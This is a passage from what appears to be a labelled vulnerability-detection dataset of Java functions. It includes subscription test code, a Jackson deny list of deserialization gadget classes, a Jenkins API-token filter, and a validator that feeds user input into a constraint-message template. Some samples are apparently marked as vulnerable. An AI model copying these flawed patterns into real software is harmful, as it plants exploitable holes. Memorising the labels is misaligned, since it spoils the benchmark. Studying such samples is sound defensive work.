subscribeOp.clone().setUri(factoryUri).setAction(Action.DELETE);\n        this.host.stopSubscriptionService(delete, notificationTarget);\n        this.host.testWait();\n        this.verifySubscriberCount(new URI[]{factoryUri}, 0);\n    }\n\n    private void doNotificationsWithReplayState(URI[] childUris)\n            throws Throwable {\n        this.host.log(\"starting subscription with replay\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n        ServiceSubscriber sr = createAndStartNotificationTarget(\n                UUID.randomUUID().toString(),\n                deletesRemainingCount);\n        sr.replayState = true;\n        // Subscribe to notifications from every example service; get notified with current state\n        subscribeToServices(childUris, sr);\n        verifySubscriberCount(childUris, 1);\n\n        patchChildren(childUris, false);\n\n        patchChildren(childUris, false);\n\n        // Finally un subscribe the notification handlers\n        unsubscribeFromChildren(childUris, sr.reference, false);\n        verifySubscriberCount(childUris, 0);\n        deleteNotificationTarget(deletesRemainingCount, sr);\n    }\n\n    private void doNotificationsWithExpiration(URI[] childUris)\n            throws Throwable {\n        this.host.log(\"starting subscription with expiration\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n\n        // start a notification target that will not complete test iterations since expirations race\n        // with notifications, allowing for notifications to be processed after the next test starts\n        ServiceSubscriber sr = createAndStartNotificationTarget(UUID.randomUUID()\n                .toString(), deletesRemainingCount, false, false);\n        sr.documentExpirationTimeMicros = Utils.fromNowMicrosUtc(\n                this.host.getMaintenanceIntervalMicros() * 2);\n        // Subscribe to notifications from every example service; get notified with current state\n        subscribeToServices(childUris, sr);\n        verifySubscriberCount(childUris, 1);\n\n        Thread.sleep((this.host.getMaintenanceIntervalMicros() / 1000) * 2);\n        // do a patch which will cause the publisher to evaluate and expire subscriptions\n        patchChildren(childUris, true);\n\n        verifySubscriberCount(childUris, 0);\n\n        deleteNotificationTarget(deletesRemainingCount, sr);\n    }\n\n    private void deleteNotificationTarget(AtomicInteger deletesRemainingCount,\n            ServiceSubscriber sr) throws Throwable {\n        deletesRemainingCount.set(1);\n        TestContext ctx = testCreate(1);\n        this.host.send(Operation.createDelete(sr.reference)\n                .setCompletion((o, e) -> ctx.completeIteration()));\n        testWait(ctx);\n    }\n\n    private void doNotificationsWithFailure(URI[] childUris) throws Throwable, InterruptedException {\n        this.host.log(\"starting subscription with failure, stopping notification target\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n        ServiceSubscriber sr = createAndStartNotificationTarget(UUID.randomUUID()\n                .toString(), deletesRemainingCount);\n        // Re subscribe, but stop the notification target, causing automatic removal of the\n        // subscriptions\n        subscribeToServices(childUris, sr);\n        verifySubscriberCount(childUris, 1);\n        deleteNotificationTarget(deletesRemainingCount, sr);\n\n        // send updates and expect failure in delivering notifications\n        patchChildren(childUris, true);\n        // expect the publisher to note at least one failed notification attempt\n        verifySubscriberCount(true, childUris, 1, 1L);\n\n        // restart notification target service but expect a pragma in the notifications\n        // saying we missed some\n        boolean expectSkippedNotificationsPragma = true;\n        this.host.log(\"restarting notification target\");\n        createAndStartNotificationTarget(sr.reference.getPath(),\n                deletesRemainingCount, expectSkippedNotificationsPragma, true);\n\n        // send some more updates, this time expect ZERO failures;\n        patchChildren(childUris, false);\n        verifySubscriberCount(true, childUris, 1, 0L);\n\n        this.host.log(\"stopping notification target, again\");\n        deleteNotificationTarget(deletesRemainingCount, sr);\n\n        while (!verifySubscriberCount(false, childUris, 0, null)) {\n            Thread.sleep(VerificationHost.FAST_MAINT_INTERVAL_MILLIS);\n            patchChildren(childUris, true);\n        }\n\n        this.host.log(\"Verifying all subscriptions have been removed\");\n        // because we sent more than K updates, causing K + 1 notification delivery failures,\n        // the subscriptions should all be automatically removed!\n        verifySubscriberCount(childUris, 0);\n    }\n\n    private void doNotificationsWithLimitAndPublicUri(URI[] childUris) throws Throwable,\n            InterruptedException, TimeoutException {\n        this.host.log(\"starting subscription with limit and public uri\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n        ServiceSubscriber sr = createAndStartNotificationTarget(UUID.randomUUID()\n                .toString(), deletesRemainingCount);\n        // Re subscribe, use public URI and limit notifications to one.\n        // After these notifications are sent, we should see all subscriptions removed\n        deletesRemainingCount.set(childUris.length + 1);\n        sr.usePublicUri = true;\n        sr.notificationLimit = this.updateCount;\n\n        subscribeToServices(childUris, sr);\n        verifySubscriberCount(childUris, 1);\n        // Issue another patch request on every example service instance\n        patchChildren(childUris, false);\n\n        // because we set notificationLimit, all subscriptions should be removed\n        verifySubscriberCount(childUris, 0);\n\n        Date exp = this.host.getTestExpiration();\n        // verify we received DELETEs on the notification target when a subscription was removed\n        while (deletesRemainingCount.get() != 1) {\n            Thread.sleep(250);\n            if (new Date().after(exp)) {\n                throw new TimeoutException(\"DELETEs not received at notification target:\"\n                        + deletesRemainingCount.get());\n            }\n        }\n\n        deleteNotificationTarget(deletesRemainingCount, sr);\n    }\n\n    private void doDeleteNotifications(URI[] childUris, Long counterValue) throws Throwable {\n        this.host.log(\"starting subscription for DELETEs\");\n        final AtomicInteger deletesRemainingCount = new AtomicInteger();\n        ServiceSubscriber sr = createAndStartNotificationTarget(UUID.randomUUID()\n                .toString(), deletesRemainingCount);\n        subscribeToServices(childUris, sr);\n\n        // Issue DELETEs and verify the subscription was notified\n        this.host.testStart(childUris.length * 2);\n        for (URI child : childUris) {\n            ExampleServiceState initialState = new ExampleServiceState();\n            initialState.counter = counterValue;\n            Operation delete = Operation\n                    .createDelete(child)\n                    .setBody(initialState)\n                    .setCompletion(this.host.getCompletion());\n            this.host.send(delete);\n        }\n        this.host.testWait();\n        deleteNotificationTarget(deletesRemainingCount, sr);\n    }\n\n    private ServiceSubscriber createAndStartNotificationTarget(String link,\n            final AtomicInteger deletesRemainingCount) throws Throwable {\n        return createAndStartNotificationTarget(link, deletesRemainingCount, false, true);\n    }\n\n    private ServiceSubscriber createAndStartNotificationTarget(String link,\n            final AtomicInteger deletesRemainingCount,\n            boolean expectSkipNotificationsPragma,\n            boolean completeIterations) throws Throwable {\n        final AtomicBoolean seenSkippedNotificationPragma =\n                new AtomicBoolean(false);\n\n        return createAndStartNotificationTarget(link, (update) -> {\n            if (!update.isNotification()) {\n                if (update.getAction() == Action.DELETE) {\n                    int r = deletesRemainingCount.decrementAndGet();\n                    if (r != 0) {\n                        update.complete();\n                        return true;\n                    }\n                }\n                return false;\n            }\n\n            if (update.getAction() != Action.PATCH &&\n                    update.getAction() != Action.PUT &&\n                    update.getAction() != Action.DELETE) {\n                update.complete();\n                return true;\n            }\n\n            if (expectSkipNotificationsPragma) {\n                String pragma = update.getRequestHeader(Operation.PRAGMA_HEADER);\n                if (!seenSkippedNotificationPragma.get() && (pragma == null\n                        || !pragma.contains(Operation.PRAGMA_DIRECTIVE_SKIPPED_NOTIFICATIONS))) {\n                    this.host.failIteration(new IllegalStateException(\n                            \"Missing skipped notification pragma\"));\n                    return true;\n                } else {\n                    seenSkippedNotificationPragma.set(true);\n                }\n            }\n\n            if (completeIterations) {\n                this.host.completeIteration();\n            }\n\n            update.complete();\n            return true;\n        });\n    }\n\n    private ServiceSubscriber createAndStartNotificationTarget(\n            Function<Operation, Boolean> h) throws Throwable {\n        return createAndStartNotificationTarget(UUID.randomUUID().toString(), h);\n    }\n\n    private ServiceSubscriber createAndStartNotificationTarget(\n            String link,\n            Function<Operation, Boolean> h) throws Throwable {\n        StatelessService notificationTarget = createNotificationTargetService(h);\n\n        // Start notification target (shared between subscriptions)\n        Operation startOp = Operation\n                .createPost(UriUtils.buildUri(this.host, link))\n                .setCompletion(this.host.getCompletion())\n                .setReferer(this.host.getReferer());\n        this.host.testStart(1);\n        this.host.startService(startOp, notificationTarget);\n        this.host.testWait();\n\n        ServiceSubscriber sr = new ServiceSubscriber();\n        sr.reference = notificationTarget.getUri();\n        return sr;\n    }\n\n    private StatelessService createNotificationTargetService(Function<Operation, Boolean> h) {\n        return new StatelessService() {\n            @Override\n            public void handleRequest(Operation update) {\n                if (!h.apply(update)) {\n                    super.handleRequest(update);\n                }\n            }\n        };\n    }\n\n    private void subscribeToServices(URI[] uris, ServiceSubscriber sr) throws Throwable {\n        int expectedCompletions = uris.length;\n        if (sr.replayState) {\n            expectedCompletions *= 2;\n        }\n        subscribeToServices(uris, sr, expectedCompletions);\n    }\n\n    private void subscribeToServices(URI[] uris, ServiceSubscriber sr, int expectedCompletions) throws Throwable {\n        this.host.testStart(expectedCompletions);\n        for (int i = 0; i < uris.length; i++) {\n            subscribeToService(uris[i], sr);\n        }\n        this.host.testWait();\n    }\n\n    private void subscribeToService(URI uri, ServiceSubscriber sr) {\n        if (sr.usePublicUri) {\n            sr = Utils.clone(sr);\n            sr.reference = UriUtils.buildPublicUri(this.host, sr.reference.getPath());\n        }\n\n        URI subUri = UriUtils.buildSubscriptionUri(uri);\n        this.host.send(Operation.createPost(subUri)\n                .setCompletion(this.host.getCompletion())\n                .setReferer(this.host.getReferer())\n                .setBody(sr)\n                .addPragmaDirective(Operation.PRAGMA_DIRECTIVE_QUEUE_FOR_SERVICE_AVAILABILITY));\n    }\n\n    private void unsubscribeFromChildren(URI[] uris, URI targetUri,\n            boolean useServiceHostStopSubscription) throws Throwable {\n        int count = uris.length;\n        TestContext ctx = testCreate(count);\n        for (int i = 0; i < count; i++) {\n            if (useServiceHostStopSubscription) {\n                // stop the subscriptions using the service host API\n                host.stopSubscriptionService(\n                        Operation.createDelete(uris[i])\n                                .setCompletion(ctx.getCompletion()),\n                        targetUri);\n                continue;\n            }\n            ServiceSubscriber unsubscribeBody = new ServiceSubscriber();\n            unsubscribeBody.reference = targetUri;\n\n            URI subUri = UriUtils.buildSubscriptionUri(uris[i]);\n            this.host.send(Operation.createDelete(subUri)\n                    .setCompletion(ctx.getCompletion())\n                    .setBody(unsubscribeBody));\n        }\n        testWait(ctx);\n    }\n\n    private boolean verifySubscriberCount(URI[] uris, int subscriberCount) throws Throwable {\n        return verifySubscriberCount(true, uris, subscriberCount, null);\n    }\n\n    private boolean verifySubscriberCount(boolean wait, URI[] uris, int subscriberCount,\n            Long failedNotificationCount)\n            throws Throwable {\n        URI[] subUris = new URI[uris.length];\n        int i = 0;\n        for (URI u : uris) {\n            URI subUri = UriUtils.buildSubscriptionUri(u);\n            subUris[i++] = subUri;\n        }\n\n        AtomicBoolean isConverged = new AtomicBoolean();\n        this.host.waitFor(\"subscriber verification timed out\", () -> {\n            isConverged.set(true);\n            Map<URI, ServiceSubscriptionState> subStates = new ConcurrentSkipListMap<>();\n            TestContext ctx = this.host.testCreate(uris.length);\n            for (URI u : subUris) {\n                this.host.send(Operation.createGet(u).setCompletion((o, e) -> {\n                    ServiceSubscriptionState s = null;\n                    if (e == null) {\n                        s = o.getBody(ServiceSubscriptionState.class);\n                    } else {\n                        this.host.log(\"error response from %s: %s\", o.getUri(), e.getMessage());\n                        // because we stopped an owner node, if gossip is not updated a GET\n                        // to subscriptions might fail because it was forward to a stale node\n                        s = new ServiceSubscriptionState();\n                        s.subscribers = new HashMap<>();\n                    }\n                    subStates.put(o.getUri(), s);\n                    ctx.complete();\n                }));\n            }\n            ctx.await();\n\n            for (ServiceSubscriptionState state : subStates.values()) {\n                int expected = subscriberCount;\n                int actual = state.subscribers.size();\n                if (actual != expected) {\n                    isConverged.set(false);\n                    break;\n                }\n\n                if (failedNotificationCount == null) {\n                    continue;\n                }\n\n                for (ServiceSubscriber sr : state.subscribers.values()) {\n                    if (sr.failedNotificationCount == null && failedNotificationCount == 0) {\n                        continue;\n                    }\n                    if (sr.failedNotificationCount == null\n                            || 0 != sr.failedNotificationCount.compareTo(failedNotificationCount)) {\n                        isConverged.set(false);\n                        break;\n                    }\n                }\n\n            }\n            if (isConverged.get() || !wait) {\n                return true;\n            }\n\n            return false;\n        });\n\n        return isConverged.get();\n    }\n\n    private void patchChildren(URI[] uris, boolean expectFailure) throws Throwable {\n        int count = expectFailure ? uris.length : uris.length * 2;\n        long c = this.updateCount;\n        if (!expectFailure) {\n            count *= this.updateCount;\n        } else {\n            c = 1;\n        }\n\n        this.host.testStart(count);\n        for (int i = 0; i < uris.length; i++) {\n            for (int k = 0; k < c; k++) {\n                ExampleServiceState initialState = new ExampleServiceState();\n                initialState.counter = Long.MAX_VALUE;\n                Operation patch = Operation\n                        .createPatch(uris[i])\n                        .setBody(initialState)\n                        .setCompletion(this.host.getCompletion());\n                this.host.send(patch);\n            }\n        }\n        this.host.testWait();\n    }\n}\n", "target": 0}
{"idx": 1108, "func": "package org.richfaces.demo.paint2d;\n\nimport java.io.Serializable;\n\npublic class PaintData implements Serializable{\n\t/**\n\t * \n\t */\n\tprivate static final long serialVersionUID = 1L;\n\tString text;\n\tInteger color;\n\tfloat scale;\n\n\n\tpublic Integer getColor() {\n\t\treturn color;\n\t}\n\tpublic void setColor(Integer color) {\n\t\tthis.color = color;\n\t}\n\tpublic float getScale() {\n\t\treturn scale;\n\t}\n\tpublic void setScale(float scale) {\n\t\tthis.scale = scale;\n\t}\n\n\tpublic String getText() {\n\t\treturn text;\n\t}\n\tpublic void setText(String text) {\n\t\tthis.text = text;\n\t}\n}\n", "target": 1}
{"idx": 1109, "func": "package com.fasterxml.jackson.databind.jsontype.impl;\n\nimport java.util.Collections;\nimport java.util.HashSet;\nimport java.util.Set;\n\nimport com.fasterxml.jackson.databind.DeserializationContext;\nimport com.fasterxml.jackson.databind.JavaType;\nimport com.fasterxml.jackson.databind.JsonMappingException;\n\n/**\n * Helper class used to encapsulate rules that determine subtypes that\n * are invalid to use, even with default typing, mostly due to security\n * concerns.\n * Used by <code>BeanDeserializerFacotry</code>\n *\n * @since 2.8.11\n */\npublic class SubTypeValidator\n{\n    protected final static String PREFIX_SPRING = \"org.springframework.\";\n\n    protected final static String PREFIX_C3P0 = \"com.mchange.v2.c3p0.\";\n\n    /**\n     * Set of well-known \"nasty classes\", deserialization of which is considered dangerous\n     * and should (and is) prevented by default.\n     */\n    protected final static Set<String> DEFAULT_NO_DESER_CLASS_NAMES;\n    static {\n        Set<String> s = new HashSet<String>();\n        // Courtesy of [https://github.com/kantega/notsoserial]:\n        // (and wrt [databind#1599])\n        s.add(\"org.apache.commons.collections.functors.InvokerTransformer\");\n        s.add(\"org.apache.commons.collections.functors.InstantiateTransformer\");\n        s.add(\"org.apache.commons.collections4.functors.InvokerTransformer\");\n        s.add(\"org.apache.commons.collections4.functors.InstantiateTransformer\");\n        s.add(\"org.codehaus.groovy.runtime.ConvertedClosure\");\n        s.add(\"org.codehaus.groovy.runtime.MethodClosure\");\n        s.add(\"org.springframework.beans.factory.ObjectFactory\");\n        s.add(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\");\n        s.add(\"org.apache.xalan.xsltc.trax.TemplatesImpl\");\n        // [databind#1680]: may or may not be problem, take no chance\n        s.add(\"com.sun.rowset.JdbcRowSetImpl\");\n        // [databind#1737]; JDK provided\n        s.add(\"java.util.logging.FileHandler\");\n        s.add(\"java.rmi.server.UnicastRemoteObject\");\n        // [databind#1737]; 3rd party\n//s.add(\"org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor\"); // deprecated by [databind#1855]\n        s.add(\"org.springframework.beans.factory.config.PropertyPathFactoryBean\");\n\n// s.add(\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\"); // deprecated by [databind#1931]\n// s.add(\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"); // - \"\" -\n        // [databind#1855]: more 3rd party\n        s.add(\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\");\n        s.add(\"com.sun.org.apache.bcel.internal.util.ClassLoader\");\n        // [databind#2032]: more 3rd party; data exfiltration via xml parsed ext entities\n        s.add(\"org.apache.ibatis.parsing.XPathParser\");\n\n        // [databind#2052]: Jodd-db, with jndi/ldap lookup\n        s.add(\"jodd.db.connection.DataSourceConnectionProvider\");\n\n        // [databind#2058]: Oracle JDBC driver, with jndi/ldap lookup\n        s.add(\"oracle.jdbc.connector.OracleManagedConnectionFactory\");\n        s.add(\"oracle.jdbc.rowset.OracleJDBCRowSet\");\n        // [databind#1899]: more 3rd party\n        s.add(\"org.hibernate.jmx.StatisticsService\");\n        s.add(\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\");\n\n        // [databind#2097]: some 3rd party, one JDK-bundled\n        s.add(\"org.slf4j.ext.EventData\");\n        s.add(\"flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor\");\n        s.add(\"com.sun.deploy.security.ruleset.DRSHelper\");\n        s.add(\"org.apache.axis2.jaxws.spi.handler.HandlerResolverImpl\");\n\n        // [databind#2186]: yet more 3rd party gadgets\n        s.add(\"org.jboss.util.propertyeditor.DocumentEditor\");\n        s.add(\"org.apache.openjpa.ee.RegistryManagedRuntime\");\n        s.add(\"org.apache.openjpa.ee.JNDIManagedRuntime\");\n        s.add(\"org.apache.axis2.transport.jms.JMSOutTransportInfo\");        \n        DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);\n    }\n\n    /**\n     * Set of class names of types that are never to be deserialized.\n     */\n    protected Set<String> _cfgIllegalClassNames = DEFAULT_NO_DESER_CLASS_NAMES;\n\n    private final static SubTypeValidator instance = new SubTypeValidator();\n\n    protected SubTypeValidator() { }\n\n    public static SubTypeValidator instance() { return instance; }\n\n    public void validateSubType(DeserializationContext ctxt, JavaType type) throws JsonMappingException\n    {\n        // There are certain nasty classes that could cause problems, mostly\n        // via default typing -- catch them here.\n        final Class<?> raw = type.getRawClass();\n        String full = raw.getName();\n\n        main_check:\n        do {\n            if (_cfgIllegalClassNames.contains(full)) {\n                break;\n            }\n\n            // 18-Dec-2017, tatu: As per [databind#1855], need bit more sophisticated handling\n            //    for some Spring framework types\n            // 05-Jan-2017, tatu: ... also, only applies to classes, not interfaces\n            if (raw.isInterface()) {\n                ;\n            } else if (full.startsWith(PREFIX_SPRING)) {\n                for (Class<?> cls = raw; (cls != null) && (cls != Object.class); cls = cls.getSuperclass()){\n                    String name = cls.getSimpleName();\n                    // looking for \"AbstractBeanFactoryPointcutAdvisor\" but no point to allow any is there?\n                    if (\"AbstractPointcutAdvisor\".equals(name)\n                            // ditto  for \"FileSystemXmlApplicationContext\": block all ApplicationContexts\n                            || \"AbstractApplicationContext\".equals(name)) {\n                        break main_check;\n                    }\n                }\n            } else if (full.startsWith(PREFIX_C3P0)) {\n                // [databind#1737]; more 3rd party\n                // s.add(\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\");\n                // s.add(\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\");\n                // [databind#1931]; more 3rd party\n                // com.mchange.v2.c3p0.ComboPooledDataSource\n                // com.mchange.v2.c3p0.debug.AfterCloseLoggingComboPooledDataSource \n                if (full.endsWith(\"DataSource\")) {\n                    break main_check;\n                }\n            }\n            return;\n        } while (false);\n\n        throw JsonMappingException.from(ctxt,\n                String.format(\"Illegal type (%s) to deserialize: prevented for security reasons\", full));\n    }\n}\n", "target": 0}
{"idx": 1110, "func": "package jenkins.security;\n\nimport hudson.model.User;\nimport hudson.security.ACL;\nimport hudson.util.Scrambler;\nimport org.acegisecurity.context.SecurityContext;\nimport org.acegisecurity.context.SecurityContextHolder;\n\nimport javax.servlet.Filter;\nimport javax.servlet.FilterChain;\nimport javax.servlet.FilterConfig;\nimport javax.servlet.ServletException;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletResponse;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\n/**\n * {@link Filter} that performs HTTP basic authentication based on API token.\n *\n * <p>\n * Normally the filter chain would also contain another filter that handles BASIC\n * auth with the real password. Care must be taken to ensure that this doesn't\n * interfere with the other.\n *\n * @author Kohsuke Kawaguchi\n */\npublic class ApiTokenFilter implements Filter {\n    public void init(FilterConfig filterConfig) throws ServletException {\n    }\n\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n        HttpServletRequest req = (HttpServletRequest) request;\n        HttpServletResponse rsp = (HttpServletResponse) response;\n        String authorization = req.getHeader(\"Authorization\");\n\n        if (authorization!=null) {\n            // authenticate the user\n            String uidpassword = Scrambler.descramble(authorization.substring(6));\n            int idx = uidpassword.indexOf(':');\n            if (idx >= 0) {\n                String username = uidpassword.substring(0, idx);\n                String password = uidpassword.substring(idx+1);\n\n                // attempt to authenticate as API token\n                User u = User.get(username);\n                ApiTokenProperty t = u.getProperty(ApiTokenProperty.class);\n                if (t!=null && t.matchesPassword(password)) {\n                    // even if we fail to match the password, we aren't rejecting it.\n                    // as the user might be passing in a real password.\n                    SecurityContext oldContext = ACL.impersonate(u.impersonate());\n                    try {\n                        request.setAttribute(ApiTokenProperty.class.getName(), u);\n                        chain.doFilter(request,response);\n                        return;\n                    } finally {\n                        SecurityContextHolder.setContext(oldContext);\n                    }\n                }\n            }\n        }\n\n        chain.doFilter(request,response);\n    }\n\n    public void destroy() {\n    }\n}\n", "target": 1}
{"idx": 1111, "func": "package com.browserup.bup.rest.validation;\n\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\n\nimport javax.validation.Constraint;\nimport javax.validation.ConstraintValidator;\nimport javax.validation.ConstraintValidatorContext;\nimport javax.validation.Payload;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\n@Retention(RetentionPolicy.RUNTIME)\n@Constraint(validatedBy = { LongPositiveConstraint.LongPositiveValidator.class })\npublic @interface LongPositiveConstraint {\n\n  String message() default \"\";\n\n  String paramName() default \"\";\n\n  Class<?>[] groups() default {};\n\n  int value();\n\n  Class<? extends Payload>[] payload() default {};\n\n  class LongPositiveValidator implements ConstraintValidator<LongPositiveConstraint, String> {\n    private static final Logger LOG = LoggerFactory.getLogger(LongPositiveValidator.class);\n\n    @Override\n    public void initialize(LongPositiveConstraint constraintAnnotation) {\n    }\n\n    @Override\n    public boolean isValid(String value, ConstraintValidatorContext context) {\n      long longValue = 0;\n      boolean failed = false;\n      String errorMessage = \"\";\n      try {\n        longValue = Long.parseLong(value);\n      } catch (NumberFormatException ex) {\n        failed = true;\n        errorMessage = String.format(\"Invalid integer value: '%s'\", value);\n      }\n\n      if (!failed && longValue < 0) {\n        failed = true;\n        errorMessage = String.format(\"Expected positive integer value, got: '%s'\", value);\n      }\n\n      if (!failed) {\n        return true;\n      }\n\n      LOG.warn(errorMessage);\n      context.buildConstraintViolationWithTemplate(errorMessage).addConstraintViolation();\n\n      return false;\n    }\n  }\n}", "target": 1}
{"idx": 1112, "func": "/*\n * DO NOT ALTER OR REMOVE COPYRIGHT NOTICES OR THIS HEADER.\n *\n * Copyright (c) 1997-2013 Oracle and/or its affiliates. All rights reserved.\n *\n * The contents of this file are subject to the terms of either the GNU\n * General Public License Version 2 only (\"GPL\") or the Common Development\n * and Distribution License(\"CDDL\") (collectively, the \"License\").  You\n * may not use this file except in compliance with the License.  You can\n * obtain a copy of the License at\n * https://glassfish.dev.java.net/public/CDDL+GPL_1_1.html\n * or packager/legal/LICENSE.txt.  See the License for the specific\n * language governing permissions and limitations under the License.\n *\n * When distributing the software, include this License Header Notice in each\n * file and include the License file at packager/legal/LICENSE.txt.\n *\n * GPL Classpath Exception:\n * Oracle designates this particular file as subject to the \"Classpath\"\n * exception as provided by Oracle in the GPL Version 2 section of the License\n * file that accompanied this code.\n *\n * Modifications:\n * If applicable, add the following below the License Header, with the fields\n * enclosed by brackets [] replaced by your own identifying information:\n * \"Portions Copyright [year] [name of copyright owner]\"\n *\n * Contributor(s):\n * If you wish your version of this file to be governed by only the CDDL or\n * only the GPL Version 2, indicate your decision by adding \"[Contributor]\n * elects to include this software in this distribution under the [CDDL or GPL\n * Version 2] license.\"  If you don't indicate a single choice of license, a\n * recipient has the option to distribute your version of this file under\n * either the CDDL, the GPL Version 2 or to extend the choice of license to\n * its licensees as provided above.  However, if you add GPL Version 2 code\n * and therefore, elected the GPL Version 2 license, then the option applies\n * only if the new code is made subject to such option by the copyright\n * holder.\n */\n\npackage com.sun.faces.context;\n\nimport com.sun.faces.component.visit.PartialVisitContext;\nimport javax.faces.FacesException;\nimport javax.faces.component.UIComponent;\nimport javax.faces.component.UIViewRoot;\nimport javax.faces.component.visit.VisitCallback;\nimport javax.faces.component.visit.VisitContext;\nimport javax.faces.component.visit.VisitHint;\nimport javax.faces.component.visit.VisitResult;\nimport javax.faces.context.ExternalContext;\nimport javax.faces.context.FacesContext;\nimport javax.faces.context.PartialResponseWriter;\nimport javax.faces.context.PartialViewContext;\nimport javax.faces.context.ResponseWriter;\nimport javax.faces.event.PhaseId;\n\nimport java.io.Writer;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.EnumSet;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Arrays;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\nimport com.sun.faces.util.FacesLogger;\nimport com.sun.faces.util.Util;\nimport javax.faces.FactoryFinder;\nimport static javax.faces.FactoryFinder.VISIT_CONTEXT_FACTORY;\nimport javax.faces.component.visit.VisitContextFactory;\nimport javax.faces.component.visit.VisitContextWrapper;\nimport javax.faces.lifecycle.ClientWindow;\nimport javax.faces.render.RenderKit;\nimport javax.faces.render.RenderKitFactory;\n\n public class PartialViewContextImpl extends PartialViewContext {\n\n    // Log instance for this class\n    private static Logger LOGGER = FacesLogger.CONTEXT.getLogger();\n\n    private boolean released;\n\n    // BE SURE TO ADD NEW IVARS TO THE RELEASE METHOD\n    private PartialResponseWriter partialResponseWriter;\n    private List<String> executeIds;\n    private Collection<String> renderIds;\n    private Boolean ajaxRequest;\n    private Boolean partialRequest;\n    private Boolean renderAll;\n    private FacesContext ctx;\n    private boolean processingPhases = false;\n\n    private static final String ORIGINAL_WRITER = \"com.sun.faces.ORIGINAL_WRITER\";\n\n\n    // ----------------------------------------------------------- Constructors\n\n\n    public PartialViewContextImpl(FacesContext ctx) {\n        this.ctx = ctx;\n    }\n\n\n    // ---------------------------------------------- Methods from PartialViewContext\n\n    /**\n     * @see javax.faces.context.PartialViewContext#isAjaxRequest()\n     */\n    @Override\n    public boolean isAjaxRequest() {\n\n        assertNotReleased();\n        if (ajaxRequest == null) {\n            ajaxRequest = \"partial/ajax\".equals(ctx.\n                getExternalContext().getRequestHeaderMap().get(\"Faces-Request\"));\n            if (!ajaxRequest) {\n                ajaxRequest = \"partial/ajax\".equals(ctx.getExternalContext().getRequestParameterMap().\n                    get(\"Faces-Request\"));\n            }\n        }\n        return ajaxRequest;\n\n    }\n\n    /**\n     * @see javax.faces.context.PartialViewContext#isPartialRequest()\n     */\n    @Override\n    public boolean isPartialRequest() {\n\n        assertNotReleased();\n        if (partialRequest == null) {\n            partialRequest = isAjaxRequest() ||\n                    \"partial/process\".equals(ctx.\n                    getExternalContext().getRequestHeaderMap().get(\"Faces-Request\"));\n        }\n        return partialRequest;\n\n    }\n\n\n    /**\n     * @see javax.faces.context.PartialViewContext#isExecuteAll()\n     */\n    @Override\n    public boolean isExecuteAll() {\n\n        assertNotReleased();\n        String execute = ctx.\n            getExternalContext().getRequestParameterMap()\n                .get(PARTIAL_EXECUTE_PARAM_NAME);\n        return (ALL_PARTIAL_PHASE_CLIENT_IDS.equals(execute));\n\n    }\n\n    /**\n     * @see javax.faces.context.PartialViewContext#isRenderAll()\n     */\n    @Override\n    public boolean isRenderAll() {\n\n        assertNotReleased();\n        if (renderAll == null) {\n            String render = ctx.\n                getExternalContext().getRequestParameterMap()\n                    .get(PARTIAL_RENDER_PARAM_NAME);\n            renderAll = (ALL_PARTIAL_PHASE_CLIENT_IDS.equals(render));\n        }\n\n        return renderAll;\n\n    }\n    \n    /**\n     * @see javax.faces.context.PartialViewContext#setRenderAll(boolean) \n     */\n    @Override\n    public void setRenderAll(boolean renderAll) {\n\n        this.renderAll = renderAll;\n\n    }\n\n    @Override\n    public boolean isResetValues() {\n        Object value = ctx.getExternalContext().getRequestParameterMap().get(RESET_VALUES_PARAM_NAME);\n        return (null != value && \"true\".equals(value)) ? true : false;\n    }\n\n    @Override\n    public void setPartialRequest(boolean isPartialRequest) {\n        this.partialRequest = isPartialRequest;\n    }\n\n\n    /**\n     * @see javax.faces.context.PartialViewContext#getExecuteIds()\n     */\n    @Override\n    public Collection<String> getExecuteIds() {\n\n        assertNotReleased();\n        if (executeIds != null) {\n            return executeIds;\n        }\n        executeIds = populatePhaseClientIds(PARTIAL_EXECUTE_PARAM_NAME);\n\n        // include the view parameter facet ID if there are other execute IDs\n        // to process\n        if (!executeIds.isEmpty()) {\n            UIViewRoot root = ctx.getViewRoot();\n            if (root.getFacetCount() > 0) {\n                if (root.getFacet(UIViewRoot.METADATA_FACET_NAME) != null) {\n                    executeIds.add(0, UIViewRoot.METADATA_FACET_NAME);   \n                }\n            }\n        }\n        return executeIds;\n\n    }\n\n    /**\n     * @see javax.faces.context.PartialViewContext#getRenderIds()\n     */\n    @Override\n    public Collection<String> getRenderIds() {\n\n        assertNotReleased();\n        if (renderIds != null) {\n            return renderIds;\n        }\n        renderIds = populatePhaseClientIds(PARTIAL_RENDER_PARAM_NAME);\n        return renderIds;\n\n    }\n\n    /**\n     * @see PartialViewContext#processPartial(javax.faces.event.PhaseId) \n     */\n    @Override\n    public void processPartial(PhaseId phaseId) {\n        PartialViewContext pvc = ctx.getPartialViewContext();\n        Collection <String> myExecuteIds = pvc.getExecuteIds();\n        Collection <String> myRenderIds = pvc.getRenderIds();\n        UIViewRoot viewRoot = ctx.getViewRoot();\n\n        if (phaseId == PhaseId.APPLY_REQUEST_VALUES ||\n            phaseId == PhaseId.PROCESS_VALIDATIONS ||\n            phaseId == PhaseId.UPDATE_MODEL_VALUES) {\n\n            // Skip this processing if \"none\" is specified in the render list,\n            // or there were no execute phase client 